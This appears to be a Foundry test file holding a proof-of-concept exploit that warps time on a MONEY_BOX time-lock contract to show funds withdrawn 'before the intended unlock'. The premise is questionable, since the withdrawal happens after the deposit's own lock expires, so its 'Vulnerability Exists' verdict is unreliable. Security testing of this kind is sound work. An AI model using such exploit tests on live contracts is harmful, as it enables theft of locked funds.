// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract MoneyBoxTest is Test {
    MONEY_BOX public moneyBox;
    Log public logContract;
    
    address user1 = makeAddr("user1");
    uint256 constant LOCK_PERIOD = 1 days;
    uint256 constant DEPOSIT_AMOUNT = 1 ether;
    uint256 constant BASE_TIMESTAMP = 10000; // Minimum base time to prevent underflow
    uint256 constant MANIPULATION_OFFSET = 100; // Seconds to manipulate back

    function setUp() public {
        // Deploy required contracts
        logContract = new Log();
        moneyBox = new MONEY_BOX();
        
        // Initialize money box
        moneyBox.SetLogFile(address(logContract));
        moneyBox.SetMinSum(0); // Set min sum to zero for testing
        
        // Set up base timestamp to prevent underflow
        vm.warp(BASE_TIMESTAMP);
    }

    function testTimestampManipulationVulnerability() public {
        // Deposit at manipulated earlier time
        vm.startPrank(user1);
        vm.deal(user1, DEPOSIT_AMOUNT);
        vm.warp(BASE_TIMESTAMP - MANIPULATION_OFFSET); // Deposit at BASE - OFFSET
        moneyBox.Put{value: DEPOSIT_AMOUNT}(LOCK_PERIOD);
        vm.stopPrank();
        
        // Calculate intended normal unlock time (if not manipulated)
        uint256 intendedNormalUnlock = BASE_TIMESTAMP + LOCK_PERIOD;
        
        // Calculate manipulated unlock time (exploit)
        uint256 manipulatedUnlock = (BASE_TIMESTAMP - MANIPULATION_OFFSET) + LOCK_PERIOD;
        
        // Ensure we are withdrawing before intended unlock time
        assertLt(
            manipulatedUnlock + 1, 
            intendedNormalUnlock,
            "Must withdraw before intended unlock time"
        );
        
        // Set time to 1 second after manipulated unlock time
        vm.warp(manipulatedUnlock + 1);
        
        // Verify contract holds deposited amount
        assertEq(
            address(moneyBox).balance,
            DEPOSIT_AMOUNT,
            "Contract should hold deposit"
        );
        
        // State snapshot before Collect operation
        console2.log("--- BEFORE-Trigger Collect ---");
        uint256 contractBalanceBefore = address(moneyBox).balance;
        uint256 user1BalanceBefore = user1.balance;
        (uint256 userAccountBalanceBefore, ) = moneyBox.Acc(user1);
        
        console2.log("Contract ETH Balance (before):", contractBalanceBefore);
        console2.log("User1 ETH Balance (before):", user1BalanceBefore);
        console2.log("User1 Account Balance (before):", userAccountBalanceBefore);

        // Perform exploit
        console2.log("--- Trigger Collect ---");
        vm.prank(user1);
        moneyBox.Collect(DEPOSIT_AMOUNT);

        // State snapshot after Collect operation
        console2.log("--- AFTER-Trigger Collect ---");
        uint256 contractBalanceAfter = address(moneyBox).balance;
        uint256 user1BalanceAfter = user1.balance;
        (uint256 userAccountBalanceAfter, ) = moneyBox.Acc(user1);
        
        console2.log("Contract ETH Balance (after):", contractBalanceAfter);
        console2.log("User1 ETH Balance (after):", user1BalanceAfter);
        console2.log("User1 Account Balance (after):", userAccountBalanceAfter);
        
        // Compare state changes
        bool contractBalanceChanged = contractBalanceBefore != contractBalanceAfter;
        bool userBalanceChanged = user1BalanceBefore != user1BalanceAfter;
        bool accountBalanceChanged = userAccountBalanceBefore != userAccountBalanceAfter;
        
        console2.log("--- Verification Results ---");
        console2.log("Contract balance changed (1ETH -> 0):", contractBalanceChanged);
        console2.log("User1 ETH balance changed (0 -> 1ETH):", userBalanceChanged);
        console2.log("User account balance changed (1ETH -> 0):", accountBalanceChanged);
        
        bool exploitSuccess = contractBalanceChanged && 
                              userBalanceChanged && 
                              accountBalanceChanged &&
                              contractBalanceAfter == 0 &&
                              user1BalanceAfter > user1BalanceBefore && 
                              userAccountBalanceAfter == 0;
        
        console2.log("All changes as expected:", exploitSuccess);
        
        // Final vulnerability verdict
        if (exploitSuccess) {
            console2.log("Vulnerability Exists: Successfully bypassed withdrawal time lock");
        } else {
            console2.log("Vulnerability not Exist: Funds not withdrawn prematurely");
        }
    }
}